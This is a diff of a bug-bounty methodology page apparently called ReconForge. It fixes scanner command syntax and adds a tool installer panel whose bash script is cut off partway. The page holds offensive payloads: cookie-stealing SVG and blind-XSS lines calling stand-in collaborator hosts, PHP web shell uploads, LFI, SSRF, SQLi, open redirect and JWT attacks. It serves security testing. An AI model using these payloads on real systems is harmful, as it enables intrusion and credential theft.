@@ -875,6 +875,7 @@ body.theme-light .badge { background: #f8fafc; border-color: #e2e8f0; color: #64
     <span id="tbActiveEng" class="tb-active-eng" style="display:none;"></span>
   </div>
   <div class="tb-deck-center">
+    <button class="tb-btn" id="tbInstallBtn" type="button" style="border-color:var(--cyan);color:var(--cyan);background:rgba(56,189,248,0.12);font-weight:600;">📦 Install All Tools</button>
     <button class="tb-btn" id="tbEngBtn"    type="button">⚡ Engagements</button>
     <button class="tb-btn" id="tbReportBtn" type="button">📋 Report Gen</button>
     <button class="tb-btn" id="tbPipeBtn"   type="button">🚀 Script Gen</button>
@@ -1100,7 +1101,7 @@ shosubgo -d target.com -s YOUR_SHODAN_KEY</code></pre></div></div></div>
 
     <div class="step"><div class="step-head"><div class="step-title"><span class="idx">04.</span>Merge, Dedupe & Permutations</div><div class="step-toggle">▼</div></div>
     <div class="step-body"><div class="step-body-inner"><pre><code><span class="comment"># Combine everything, sort unique</span>
-cat *.txt | sort -u > all_subdomains.txt
+cat subfinder.txt assetfinder.txt crt.txt 2>/dev/null | sort -u > all_subdomains.txt
 
 <span class="comment"># Alterx permutations + dnsx live validation</span>
 cat all_subdomains.txt | alterx | dnsx -silent -o live_mutated_subs.txt
@@ -1181,8 +1182,8 @@ arjun -u https://site.com/endpoint.php -oT arjun_output.txt -t 10 --rate-limit 1
 dirsearch -u https://target.com -e php,html,js,json,bak,txt -w /usr/share/seclists/Discovery/Web-Content/common.txt --deep-recursive</code></pre></div></div></div>
 
     <div class="step"><div class="step-head"><div class="step-title"><span class="idx">16.</span>Git Repository Disclosure</div><div class="step-toggle">▼</div></div>
-    <div class="step-body"><div class="step-body-inner"><pre><code>cat urls.txt | httpx-toolkit -silent -path /.git/config -mc 200 -ms "[core]"
-cat domains.txt | httpx-toolkit -sc -server -cl -path "/.git/" -mc 200 -location -ms "Index of" -probe</code></pre></div></div></div>
+    <div class="step-body"><div class="step-body-inner"><pre><code>cat urls.txt | httpx -silent -path /.git/config -mc 200 -ms "[core]"
+cat domains.txt | httpx -sc -server -cl -path "/.git/" -mc 200 -location -ms "Index of" -probe</code></pre></div></div></div>
 
     <div class="step"><div class="step-head"><div class="step-title"><span class="idx">17.</span>JavaScript Recon & Secret Extraction</div><div class="step-toggle">▼</div></div>
     <div class="step-body"><div class="step-body-inner"><pre><code><span class="comment"># harvest .js files & scan for exposures</span>
@@ -1225,18 +1226,18 @@ masscan -p0-65535 target.com --rate 100000 -oG masscan-results.txt</code></pre><
     <div class="step-body"><div class="step-body-inner"><pre><code>cat urls.txt | gf sqli | uro | anew sqli.txt && sqlmap -m sqli.txt --batch --random-agent --level 2 --risk 2
 
 <span class="comment"># error-based quick check</span>
-cat urls.txt | gf sqli | qsreplace "'" | httpx-toolkit -silent -ms "error|sql|syntax|mysql|postgresql" | tee sqli_errors.txt
+cat urls.txt | gf sqli | qsreplace "'" | httpx -silent -ms "error|sql|syntax|mysql|postgresql" | tee sqli_errors.txt
 
 <span class="comment"># time-based blind check</span>
-cat urls.txt | gf sqli | qsreplace "1' AND SLEEP(5)-- -" | httpx-toolkit -silent -timeout 10</code></pre></div></div></div>
+cat urls.txt | gf sqli | qsreplace "1' AND SLEEP(5)-- -" | httpx -silent -timeout 10</code></pre></div></div></div>
 
     <div class="step"><div class="step-head"><div class="step-title"><span class="idx">22.</span>Cross-Site Scripting (XSS)</div><div class="step-toggle">▼</div></div>
     <div class="step-body"><div class="step-body-inner"><pre><code>echo target.com | gau | gf xss | uro | httpx -silent | Gxss -p Rxss | dalfox pipe --silence --skip-bav
 
-echo target.com | waybackurls | gf xss | uro | httpx-toolkit -silent | qsreplace '"&gt;&lt;svg onload=confirm(1)&gt;' | airixss -payload "confirm(1)"
+echo target.com | waybackurls | gf xss | uro | httpx -silent | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)"
 
 <span class="comment"># blind xss via out-of-band collaborator</span>
-subfinder -d example.com | gau | bxss -payload '"&gt;&lt;script src=https://YOUR-COLLAB&gt;&lt;/script&gt;' -header "X-Forwarded-For"</code></pre></div></div></div>
+subfinder -d example.com | gau | bxss -payload '"><script src=https://YOUR-COLLAB></script>' -header "X-Forwarded-For"</code></pre></div></div></div>
 
     <div class="step"><div class="step-head"><div class="step-title"><span class="idx">23.</span>Local File Inclusion (LFI)</div><div class="step-toggle">▼</div></div>
     <div class="step-body"><div class="step-body-inner"><pre><code>nuclei -l subs.txt -t nuclei-templates/http/vulnerabilities/generic/generic-linux-lfi.yaml -c 30
@@ -1261,14 +1262,14 @@ cat subdomains_alive.txt | httpx -silent | nuclei -t nuclei-templates/vulnerabil
 curl "https://target.com/api?endpoint=http://169.254.169.254/latest/meta-data/"
 
 <span class="comment"># OOB via interactsh / burp collaborator</span>
-cat urls.txt | gf ssrf | qsreplace "https://YOURBURP.oastify.com" | httpx-toolkit -silent</code></pre></div></div></div>
+cat urls.txt | gf ssrf | qsreplace "https://YOURBURP.oastify.com" | httpx -silent</code></pre></div></div></div>
 
     <div class="step"><div class="step-head"><div class="step-title"><span class="idx">26.</span>Open Redirect</div><div class="step-toggle">▼</div></div>
     <div class="step-body"><div class="step-body-inner"><pre><code>cat final.txt | gf redirect | uro | sort -u | tee redirect_params.txt
-cat redirect_params.txt | qsreplace "https://evil.com" | httpx-toolkit -silent -fr -mr "evil.com"</code></pre></div></div></div>
+cat redirect_params.txt | qsreplace "https://evil.com" | httpx -silent -fr -mr "evil.com"</code></pre></div></div></div>
 
     <div class="step"><div class="step-head"><div class="step-title"><span class="idx">27.</span>Subdomain Takeover</div><div class="step-toggle">▼</div></div>
-    <div class="step-body"><div class="step-body-inner"><pre><code>subzy run --targets subdomains.txt --concurrency 100 --hide_fails --verify_ssl</code></pre>
+    <div class="step-body"><div class="step-body-inner"><pre><code>subzy run --targets subdomains.txt --concurrency 100 --hide-fails --verify-ssl</code></pre>
 <div class="callout"><strong>Verify manually</strong> against fingerprints in the <code>can-i-take-over-xyz</code> repo before reporting — false positives are common here.</div>
 </div></div></div>
   </div>
@@ -1290,7 +1291,7 @@ chaos -d target.com -silent | httpx -silent -ip | awk '{print $NF}' | tr -d '[]'
 
     <div class="step"><div class="step-head"><div class="step-title"><span class="idx">31.</span>Crawled Params → CRLF & Open Redirect Pipeline</div><div class="step-toggle">▼</div></div>
     <div class="step-body"><div class="step-body-inner"><pre><code><span class="comment"># Crawled parameters se CRLF & Open Redirect verification</span>
-cat all_clean_urls.txt | gf redirect | uro | nuclei -t openRedirect.yaml</code></pre></div></div></div>
+cat all_clean_urls.txt | gf redirect | uro | nuclei -tags redirect</code></pre></div></div></div>
   </div>
 
   <!-- PHASE 10 -->
@@ -1337,53 +1338,53 @@ ffuf -u http://TARGET_IP:PORT/FUZZ -w /usr/share/seclists/Discovery/Web-Content/
 
     <div class="step"><div class="step-head"><div class="step-title"><span class="idx">38.</span>Open Redirect Testing</div><div class="step-toggle">▼</div></div>
     <div class="step-body"><div class="step-body-inner"><pre><code><span class="comment"># YAML template execution</span>
-nuclei -l or.txt -t openRedirect.yaml -retries 2
+nuclei -l or.txt -tags redirect -retries 2
 
 <span class="comment"># Manual verification — 301/302 redirect check</span>
 curl -I -s "https://target.com/redirect.php?url=https://bing.com" | grep -i "location:"</code></pre></div></div></div>
 
     <div class="step"><div class="step-head"><div class="step-title"><span class="idx">39.</span>Blind SSRF (Out-of-Band)</div><div class="step-toggle">▼</div></div>
     <div class="step-body"><div class="step-body-inner"><pre><code><span class="comment"># Interactsh / Burp Collaborator domain inject karke external DNS/HTTP interaction check karein</span>
-nuclei -l ssrf.txt -t blind-ssrf.yaml -dast</code></pre></div></div></div>
+nuclei -l ssrf.txt -tags ssrf -dast</code></pre></div></div></div>
 
     <div class="step"><div class="step-head"><div class="step-title"><span class="idx">40.</span>Response-Based SSRF / Path Traversal</div><div class="step-toggle">▼</div></div>
     <div class="step-body"><div class="step-body-inner"><pre><code><span class="comment"># Nuclei template execution</span>
-nuclei -l lfi.txt -t response-ssrf.yaml -retries 2
+nuclei -l lfi.txt -tags lfi -retries 2
 
 <span class="comment"># Manual verification via curl — direct file disclosure</span>
 curl -s "https://target.com/download.php?pdf_path=file:////etc/passwd" | head -n 10</code></pre></div></div></div>
 
     <div class="step"><div class="step-head"><div class="step-title"><span class="idx">41.</span>CRLF Injection (HTTP Response Splitting)</div><div class="step-toggle">▼</div></div>
     <div class="step-body"><div class="step-body-inner"><pre><code><span class="comment"># Template scan</span>
-nuclei -l crlf.txt -t crlf.yaml
+nuclei -l crlf.txt -tags crlf
 
 <span class="comment"># Manual confirmation — response header inspection</span>
 curl -I "https://target.com/%0d%0aSet-Cookie:test_cookie=valid" | grep -i "set-cookie"</code></pre></div></div></div>
 
     <div class="step"><div class="step-head"><div class="step-title"><span class="idx">42.</span>Error-Based &amp; Time-Based SQL Injection</div><div class="step-toggle">▼</div></div>
     <div class="step-body"><div class="step-body-inner"><pre><code><span class="comment"># Error-based</span>
-nuclei -l sqli.txt -t errsqli.yaml -dast
+nuclei -l sqli.txt -tags sqli -dast
 
 <span class="comment"># Time-based blind SQLi — response delay verify karein</span>
 time curl -s "https://target.com/report.php?id=1+AND+(SELECT+1+FROM+(SELECT(SLEEP(5)))a)"</code></pre></div></div></div>
 
     <div class="step"><div class="step-head"><div class="step-title"><span class="idx">43.</span>IIS 8.3 Short Filename Disclosure (Shortscan)</div><div class="step-toggle">▼</div></div>
     <div class="step-body"><div class="step-body-inner"><pre><code><span class="comment"># IIS vulnerability presence check</span>
-nuclei -l iis.txt -t iis.yaml
+nuclei -l iis.txt -tags iis
 
 <span class="comment"># Shortscan utility run karein</span>
 shortscan https://target.com/ -F</code></pre></div></div></div>
 
     <div class="step"><div class="step-head"><div class="step-title"><span class="idx">44.</span>Exposed Git Repositories &amp; Credential Leaks</div><div class="step-toggle">▼</div></div>
     <div class="step-body"><div class="step-body-inner"><pre><code><span class="comment"># Git exposure checks (.git/config, .git/HEAD)</span>
-nuclei -l git.txt -t gitExposed.yaml
+nuclei -l git.txt -tags git,exposure
 
 <span class="comment"># Credential & API token pattern check</span>
-nuclei -l endpoints.txt -t credentials-disclosure-all.yaml</code></pre></div></div></div>
+nuclei -l endpoints.txt -tags exposure,token,credentials</code></pre></div></div></div>
 
     <div class="step"><div class="step-head"><div class="step-title"><span class="idx">45.</span>CORS Misconfiguration Auditing</div><div class="step-toggle">▼</div></div>
     <div class="step-body"><div class="step-body-inner"><pre><code><span class="comment"># Template execution</span>
-nuclei -l cors.txt -t cors.yaml
+nuclei -l cors.txt -tags cors
 
 <span class="comment"># Manual validation — arbitrary origin reflection with credentials</span>
 curl -s -I -H "Origin: https://attacker.com" "https://target.com/wp-json/" | grep -iE "access-control-allow-origin|access-control-allow-credentials"</code></pre></div></div></div>
@@ -1538,13 +1539,13 @@ curl -i -N -H "Connection: Upgrade" -H "Upgrade: websocket" -H "Origin: https://
 
     <div class="step"><div class="step-head"><div class="step-title"><span class="idx">59.</span>JWT Token Auditing</div><div class="step-toggle">▼</div></div>
     <div class="step-body"><div class="step-body-inner"><pre><code><span class="comment"># jwt_tool — alg confusion, none-alg, signature stripping, key confusion in one pass</span>
-python3 jwt_tool.py &lt;TOKEN&gt; -M at
+python3 jwt_tool.py YOUR_JWT_TOKEN -M at
 
 <span class="comment"># Test alg:none bypass explicitly</span>
-python3 jwt_tool.py &lt;TOKEN&gt; -X a
+python3 jwt_tool.py YOUR_JWT_TOKEN -X a
 
 <span class="comment"># Brute-force weak HMAC secret</span>
-jwt-cracker &lt;TOKEN&gt; abcdefghijklmnopqrstuvwxyz 6</code></pre></div></div></div>
+jwt-cracker YOUR_JWT_TOKEN abcdefghijklmnopqrstuvwxyz 6</code></pre></div></div></div>
   </div>
 
   <!-- PHASE 16 -->
@@ -2330,13 +2331,13 @@ shell.php.         → trailing dot (Windows)
 Content-Type: image/jpeg    (while uploading .php)
 
 <span class="comment"># Magic bytes — add JPEG header before PHP code</span>
-echo -e '\xff\xd8\xff\xe0' > shell.php && echo '&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;' >> shell.php
+echo -e '\xff\xd8\xff\xe0' > shell.php && echo '<?php system($_GET["cmd"]); ?>' >> shell.php
 
 <span class="comment"># SVG XSS / SSRF even when PHP blocked</span>
 &lt;svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://BURP-COLLAB.com/'+document.cookie)"/&gt;
 
 <span class="comment"># Polyglot — valid image AND valid PHP</span>
-exiftool -Comment='&lt;?php echo shell_exec($_GET[&quot;cmd&quot;]); ?&gt;' legit.jpg -o shell.php.jpg
+exiftool -Comment='<?php echo shell_exec($_GET["cmd"]); ?>' legit.jpg -o shell.php.jpg
 
 <span class="comment"># Content-Disposition filename injection (path traversal)</span>
 Content-Disposition: form-data; name="file"; filename="../../../var/www/html/shell.php"
@@ -2653,7 +2654,7 @@ site:linkedin.com/jobs "target" "we use" OR "experience with"
 <span class="comment"># 15-min triage workflow after any new asset detected:</span>
 1. httpx probe → live?
 2. katana crawl → new endpoints?
-3. nuclei -t exposures/ → any easy wins?
+3. nuclei -tags exposure → any easy wins?
 4. manual check — same vuln classes as rest of program?</code></pre></div></div></div>
   </div>
 
@@ -2740,7 +2741,7 @@ grep -rn "http://\|https://" target_src/ | grep -v "//schemas\|//www.w3"
 grep -rn "BuildConfig\." target_src/ | grep -i "key\|secret\|url\|endpoint"
 
 <span class="comment"># Step 5 — Extract hardcoded URLs / endpoints</span>
-grep -rn "\"https://" target_src/ | sort -u | grep -v ".png\|.jpg\|.svg"
+grep -rn "https://" target_src/ | sort -u | grep -v -E "\.(png|jpg|svg)"
 
 <span class="comment"># Step 6 — Check AndroidManifest.xml for attack surface</span>
 cat target_decompiled/AndroidManifest.xml | grep -A2 "exported=\"true\"\|intent-filter"
@@ -2888,15 +2889,7 @@ ffuf -u https://api.target.com/FUZZ/users -w wordlists/api_versions.txt -mc 200,
 <span class="comment"># wordlist: v1 v2 v3 v4 v0 beta alpha internal legacy old dev staging</span>
 
 <span class="comment"># Step 4 — Swagger/OpenAPI spec discovery</span>
-ffuf -u https://target.com/FUZZ -w - -mc 200 << 'PATHS'
-swagger.json
-openapi.json
-swagger.yaml
-api-docs
-api/swagger.json
-v1/swagger.json
-v2/api-docs
-PATHS
+printf "swagger.json\nopenapi.json\nswagger.yaml\napi-docs\napi/swagger.json\nv1/swagger.json\nv2/api-docs\n" | ffuf -u https://target.com/FUZZ -w - -mc 200
 
 <span class="comment"># Step 5 — Parse Swagger spec → extract all endpoints automatically</span>
 python3 -c "
@@ -3971,6 +3964,13 @@ python3 jwt_tool.py TOKEN -C -d /usr/share/wordlists/rockyou.txt  # crack weak s
 
   <div class="tools-section">
     <h2 style="color:var(--green); letter-spacing:2px; border-left:3px solid var(--red); padding-left:10px;">[ ARSENAL — TOOLS REFERENCED ]</h2>
+    <div class="arsenal-installer-card" style="margin-top:16px;margin-bottom:18px;background:rgba(56,189,248,0.06);border:1px solid rgba(56,189,248,0.25);border-radius:8px;padding:16px 20px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:14px;">
+      <div>
+        <div style="font-weight:700;color:var(--cyan);font-size:14.5px;display:flex;align-items:center;gap:8px;">📦 Master Arsenal 1-Click Installer &amp; Tool Cloner</div>
+        <div style="color:var(--muted);font-size:12.5px;margin-top:3px;">Download or run a single bash script to install, build, and clone every tool, wordlist (SecLists), and GF patterns referenced in ReconForge.</div>
+      </div>
+      <button type="button" class="btn" id="btnArsenalInstall" onclick="document.getElementById('tbInstallBtn').click()" style="background:var(--accent);color:#06090f;font-weight:700;border:none;padding:9px 18px;border-radius:6px;cursor:pointer;font-family:inherit;font-size:12px;letter-spacing:0.5px;">📦 Download / Run Installer</button>
+    </div>
     <div class="tools-grid" id="toolsGrid"></div>
   </div>
 </div> <!-- Closes .container -->
@@ -4061,6 +4061,34 @@ python3 jwt_tool.py TOKEN -C -d /usr/share/wordlists/rockyou.txt  # crack weak s
 </div>
 
 <!-- PIPELINE SCRIPT GENERATOR PANEL -->
+<!-- MASTER ARSENAL 1-CLICK ALL TOOLS INSTALLER & CLONER PANEL -->
+<div id="toolsInstallPanel" class="side-panel" style="display:none;">
+  <div class="side-panel-inner" style="max-width:720px;">
+    <div class="side-panel-head">
+      <span style="color:var(--cyan);font-size:14px;font-weight:bold;letter-spacing:0.5px;">📦 1-CLICK ALL TOOLS INSTALLER &amp; CLONER</span>
+      <button class="sp-close" onclick="document.getElementById('toolsInstallPanel').style.display='none'">✕</button>
+    </div>
+    <p style="color:var(--text);font-size:12.5px;margin-bottom:6px;">Automated production bash script to install, compile, clone, and configure <b>all 60+ reconnaissance tools</b>, wordlists (SecLists), and GF patterns used across all 33 ReconForge phases in a single run.</p>
+    <div style="background:rgba(56,189,248,0.06);border:1px solid rgba(56,189,248,0.25);border-radius:6px;padding:10px 14px;margin-bottom:12px;font-size:11.5px;color:var(--muted);">
+      <div style="color:var(--cyan);font-weight:600;margin-bottom:4px;">⚡ Target Environments:</div>
+      Kali Linux, Ubuntu 20.04/22.04/24.04, Debian 11/12, WSL2, ParrotOS, Arch, Debian VPS
+    </div>
+
+    <div style="margin-bottom:12px;">
+      <div style="font-size:11.5px;color:var(--cyan);font-weight:600;margin-bottom:4px;">🚀 Quick Terminal 1-Liner:</div>
+      <pre style="background:var(--code-bg);border:1px solid var(--border);padding:10px 12px;border-radius:6px;font-size:12px;color:var(--text);display:flex;align-items:center;justify-content:space-between;gap:8px;"><code>chmod +x install_reconforge_tools.sh &amp;&amp; ./install_reconforge_tools.sh</code><button class="pl-copy-btn" type="button" onclick="navigator.clipboard.writeText('chmod +x install_reconforge_tools.sh && ./install_reconforge_tools.sh');this.textContent='✅ Copied';setTimeout(()=>this.textContent='📋 Copy',1300);" style="padding:3px 8px;font-size:10px;cursor:pointer;">📋 Copy</button></pre>
+    </div>
+
+    <div style="display:flex;gap:10px;margin-bottom:12px;flex-wrap:wrap;">
+      <button class="pl-save-btn" id="installerCopyBtn" type="button" style="background:var(--accent);color:#06090f;font-weight:bold;padding:7px 16px;border-radius:4px;border:none;cursor:pointer;font-family:inherit;">📋 Copy Full Installer Script</button>
+      <button class="pl-add-btn" id="installerDlBtn" type="button" style="background:#1e293b;border:1px solid var(--border);color:var(--text);padding:7px 14px;border-radius:4px;cursor:pointer;font-family:inherit;">⬇ Download install_reconforge_tools.sh</button>
+    </div>
+
+    <div style="font-size:11.5px;color:var(--muted);margin-bottom:6px;"><b>Included Toolkit:</b> Go tools (Subfinder, Httpx, Katana, Nuclei, Naabu, Dnsx, Anew, Dalfox, Gau, etc.), Python tools (Arjun, Dirsearch, SQLMap, Uro, X8, etc.), Cloned tools (SecretFinder, LinkFinder, GitDorker, favUp, etc.), SecLists, and GF Patterns.</div>
+    <pre id="installerScriptCode" class="rg-output" style="max-height:360px;overflow-y:auto;font-size:11.5px;line-height:1.5;"></pre>
+  </div>
+</div>
+
 <div id="pipePanel" class="side-panel" style="display:none;">
   <div class="side-panel-inner" style="max-width:600px;">
     <div class="side-panel-head">
@@ -4413,7 +4441,7 @@ nuclei -l live_urls.txt -t http/misconfiguration/ -t http/exposures/ -bs 50 -c 3
 nuclei -l live_urls.txt -t http/cves/ -severity critical,high -o nuclei_cves.txt
 
 # --- Phase 7/8: Targeted Testing ---
-subzy run --targets all_subdomains.txt --concurrency 100 --hide_fails --verify_ssl
+subzy run --targets all_subdomains.txt --concurrency 100 --hide-fails --verify-ssl
 cat xss_urls.txt | httpx -silent | Gxss -p Rxss | dalfox pipe --silence --skip-bav
 
 echo "[ReconForge] recon pipeline finished for ${domain}"
@@ -4457,7 +4485,7 @@ const TOOL_MAJOR_STEPS = [
   { tool: 'nuclei',           comment: 'exposures + high/critical CVEs',
     cmd: d => `nuclei -l live_urls_${d}.txt -t http/exposures/ -t http/misconfiguration/ -bs 50 -c 30 -o nuclei_exposures_${d}.txt && nuclei -l live_urls_${d}.txt -t http/cves/ -severity critical,high -o nuclei_cves_${d}.txt` },
   { tool: 'subzy',            comment: 'subdomain takeover check',
-    cmd: d => `subzy run --targets all_subdomains_${d}.txt --concurrency 100 --hide_fails --verify_ssl > subzy_${d}.txt` },
+    cmd: d => `subzy run --targets all_subdomains_${d}.txt --concurrency 100 --hide-fails --verify-ssl > subzy_${d}.txt` },
   { tool: 'dalfox',           comment: 'XSS verification',
     cmd: d => `cat xss_urls_${d}.txt | httpx -silent | Gxss -p Rxss | dalfox pipe --silence --skip-bav -o dalfox_${d}.txt` },
 ];
@@ -5927,7 +5955,7 @@ const PHASE_SCRIPTS = {
 subfinder -d TARGET -all -recursive -silent | anew subs_subfinder.txt
 assetfinder --subs-only TARGET | anew subs_assetfinder.txt
 amass enum -passive -d TARGET -o subs_amass.txt
-curl -s "https://crt.sh/?q=%.TARGET&output=json" | jq -r '.[].name_value' | sort -u | anew subs_crt.txt
+curl -s "https://crt.sh/?q=%25.TARGET&output=json" | jq -r '.[].name_value' 2>/dev/null | sed 's/\*\.//g' | sort -u | anew subs_crt.txt
 cat subs_*.txt | sort -u > all_subdomains.txt
 echo "[+] Total subdomains: $(wc -l < all_subdomains.txt)"`,
   '02 — DNS Resolve + Live Probe': `echo "[+] PHASE 02/03 — DNS Resolve + Live Hosts"
@@ -5935,18 +5963,18 @@ dnsx -l all_subdomains.txt -silent -o resolved_subs.txt
 httpx -l resolved_subs.txt -td -status-code -title -silent -o live_hosts.txt
 echo "[+] Live hosts: $(wc -l < live_hosts.txt)"`,
   '03 — Port Scanning': `echo "[+] PHASE 03 — Port Scanning"
-cat live_hosts.txt | grep -oP 'https?://\K[^/]+' | sort -u > ips_for_scan.txt
+cat live_hosts.txt | grep -oP 'https?://\K[^/:]+' | sort -u > ips_for_scan.txt
 naabu -l ips_for_scan.txt -p - -silent -o open_ports.txt
 nmap -iL ips_for_scan.txt -sV -sC -p 80,443,8080,8443,8888 -oA nmap_web`,
   '04 — Web Crawl + URL Harvest': `echo "[+] PHASE 04 — Web Crawl"
 katana -list live_hosts.txt -jc -d 5 -silent -o katana_urls.txt
-gau --threads 10 TARGET | anew gau_urls.txt
+gau TARGET --threads 10 | anew gau_urls.txt
 cat katana_urls.txt gau_urls.txt | sort -u > all_urls.txt
 echo "[+] URLs found: $(wc -l < all_urls.txt)"`,
   '05 — JS Recon': `echo "[+] PHASE 05 — JS Recon"
 cat all_urls.txt | grep '\.js$' | sort -u > js_files.txt
-cat js_files.txt | xargs -I{} sh -c 'curl -s "{}" | grep -oP "['\''\"]((/[a-zA-Z0-9_/.-]+)+)['\''\""]' >> endpoints_from_js.txt
-cat js_files.txt | xargs -I{} curl -s {} | python3 -m secretfinder - -o cli >> secrets_from_js.txt
+cat js_files.txt | xargs -I{} curl -s "{}" | grep -Eo '(\/[a-zA-Z0-9_\.\-]+){2,}' | sort -u >> endpoints_from_js.txt
+cat js_files.txt | while read -r url; do python3 SecretFinder.py -i "$url" -o cli 2>/dev/null; done >> secrets_from_js.txt
 echo "[+] JS secrets found: $(wc -l < secrets_from_js.txt)"`,
   '06 — Dir/File Fuzzing': `echo "[+] PHASE 06 — Directory Fuzzing"
 ffuf -u https://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt \
@@ -5954,7 +5982,7 @@ ffuf -u https://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-me
 feroxbuster -u https://TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt \
   --silent -o ferox_dirs.txt`,
   '07 — Nuclei Vulnerability Scan': `echo "[+] PHASE 07 — Nuclei Scan"
-nuclei -l live_hosts.txt -t exposures/ -t vulnerabilities/ -t misconfiguration/ \
+nuclei -l live_hosts.txt -tags exposure,misconfiguration,cve \
   -severity critical,high,medium -o nuclei_findings.txt -silent
 echo "[+] Nuclei findings: $(wc -l < nuclei_findings.txt)"`,
   '08 — Parameter Discovery': `echo "[+] PHASE 08 — Parameter Discovery"
@@ -6537,6 +6565,7 @@ function initThemeToggle(){
 // ── TOOLBAR BUTTON WIRING ─────────────────────────────────────
 function initToolbarButtons(){
   const panels = {
+    'tbInstallBtn': 'toolsInstallPanel',
     'tbEngBtn': 'engPanel',
     'tbReportBtn': 'reportPanel',
     'tbPipeBtn': 'pipePanel',
@@ -6687,6 +6716,298 @@ window.clearAllTargets = function(){
     if(typeof window.refreshTgPreview === 'function') window.refreshTgPreview();
   }
 };
+
+
+// ── 1-CLICK ALL TOOLS INSTALLER MODAL LOGIC ───────────────────
+(function(){
+  const scriptContent = `#!/usr/bin/env bash
+# ==============================================================================
+# ⚡ ReconForge v3 — Universal 1-Click Master Arsenal Installer & Tool Cloner
+# Engineered for Bug Bounty Hunters, Penetration Testers & Red Teams
+# Author: Pratik Khairnar (@pratik-khairnar-sec)
+# ==============================================================================
+# Compatible with: Kali Linux, Ubuntu 20.04/22.04/24.04, Debian 11/12, WSL2, VPS
+# ==============================================================================
+
+set -e
+
+# Color Palette
+C_RESET="\\033[0m"
+C_CYAN="\\033[1;36m"
+C_BLUE="\\033[1;34m"
+C_GREEN="\\033[1;32m"
+C_YELLOW="\\033[1;33m"
+C_RED="\\033[1;31m"
+C_BOLD="\\033[1m"
+
+banner() {
+    clear 2>/dev/null || true
+    echo -e "\${C_CYAN}"
+    echo "  ██████╗ ███████╗ ██████╗ ██████╗ ███╗   ██╗███████╗ ██████╗ ██████╗  ██████╗ ███████╗"
+    echo "  ██╔══██╗██╔════╝██╔════╝██╔═══██╗████╗  ██║██╔════╝██╔═══██╗██╔══██╗██╔════╝ ██╔════╝"
+    echo "  ██████╔╝█████╗  ██║     ██║   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██║  ███╗█████╗  "
+    echo "  ██╔══██╗██╔══╝  ██║     ██║   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║   ██║██╔══╝  "
+    echo "  ██║  ██║███████╗╚██████╗╚██████╔╝██║ ╚████║██║     ╚██████╔╝██║  ██║╚██████╔╝███████╗"
+    echo "  ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝"
+    echo -e "\${C_RESET}"
+    echo -e "\${C_BOLD}   ⚡ RECONFORGE v3 — 1-CLICK ALL TOOLS INSTALLER & CLONER ⚡\${C_RESET}"
+    echo -e "\${C_CYAN}   Zero-Friction Bug Bounty Reconnaissance Suite Automated Setup\${C_RESET}"
+    echo -e "\${C_BLUE}   Author: Pratik Khairnar (@pratik-khairnar-sec)\${C_RESET}"
+    echo " =============================================================================="
+    echo ""
+}
+
+banner
+
+INSTALL_DIR="$HOME/tools/reconforge"
+WORDLIST_DIR="$HOME/wordlists"
+mkdir -p "$INSTALL_DIR" "$WORDLIST_DIR" "$HOME/.gf"
+
+# --- STEP 1: OS & ROOT / SUDO CHECK ---
+echo -e "\${C_CYAN}[+] Step 1: Checking System Environment & Package Manager...\${C_RESET}"
+
+if [ "$EUID" -eq 0 ]; then
+    SUDO_CMD=""
+else
+    if command -v sudo >/dev/null 2>&1; then
+        SUDO_CMD="sudo"
+    else
+        echo -e "\${C_RED}[!] Sudo not found. Please run as root or install sudo.\${C_RESET}"
+        exit 1
+    fi
+fi
+
+# --- STEP 2: INSTALL SYSTEM DEPENDENCIES & CORE PACKAGES ---
+echo -e "\${C_CYAN}[+] Step 2: Updating APT & Installing Core Security Utilities...\${C_RESET}"
+$SUDO_CMD apt-get update -y
+$SUDO_CMD apt-get install -y --no-install-recommends \\
+    git curl wget jq build-essential make gcc libpcap-dev libssl-dev \\
+    python3 python3-pip python3-dev python3-venv \\
+    nmap masscan parallel unzip tar zip exiftool \\
+    ca-certificates gnupg lsb-release
+
+# Install optional specialized tools if available in repo
+$SUDO_CMD apt-get install -y wpscan apktool seclists 2>/dev/null || true
+
+# --- STEP 3: CONFIGURE GO ENVIRONMENT ---
+echo -e "\${C_CYAN}[+] Step 3: Verifying / Installing Golang Environment...\${C_RESET}"
+if ! command -v go >/dev/null 2>&1; then
+    echo -e "\${C_YELLOW}[*] Golang not found. Installing latest Go binary...\${C_RESET}"
+    ARCH="$(uname -m)"
+    case "$ARCH" in
+        x86_64) GO_ARCH="amd64" ;;
+        aarch64|arm64) GO_ARCH="arm64" ;;
+        *) GO_ARCH="amd64" ;;
+    esac
+    GO_VER="1.23.2"
+    wget -q "https://go.dev/dl/go\${GO_VER}.linux-\${GO_ARCH}.tar.gz" -O /tmp/go.tar.gz
+    $SUDO_CMD rm -rf /usr/local/go
+    $SUDO_CMD tar -C /usr/local -xzf /tmp/go.tar.gz
+    rm -f /tmp/go.tar.gz
+    export PATH=$PATH:/usr/local/go/bin
+fi
+
+export GOPATH="$HOME/go"
+export PATH="$PATH:$GOPATH/bin:/usr/local/go/bin"
+
+# Persist PATH in shell rc files
+for RC in "$HOME/.bashrc" "$HOME/.zshrc"; do
+    if [ -f "$RC" ]; then
+        if ! grep -q 'go/bin' "$RC"; then
+            echo 'export GOPATH="$HOME/go"' >> "$RC"
+            echo 'export PATH="$PATH:$GOPATH/bin:/usr/local/go/bin"' >> "$RC"
+        fi
+    fi
+done
+
+echo -e "\${C_GREEN}[✓] Go Version: $(go version)\${C_RESET}"
+
+# --- STEP 4: INSTALL ALL GO RECONNAISSANCE TOOLS ---
+echo -e "\${C_CYAN}[+] Step 4: Installing Golang Recon Tools (Go Install)...\${C_RESET}"
+
+declare -A GO_TOOLS=(
+    ["subfinder"]="github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest"
+    ["httpx"]="github.com/projectdiscovery/httpx/cmd/httpx@latest"
+    ["katana"]="github.com/projectdiscovery/katana/cmd/katana@latest"
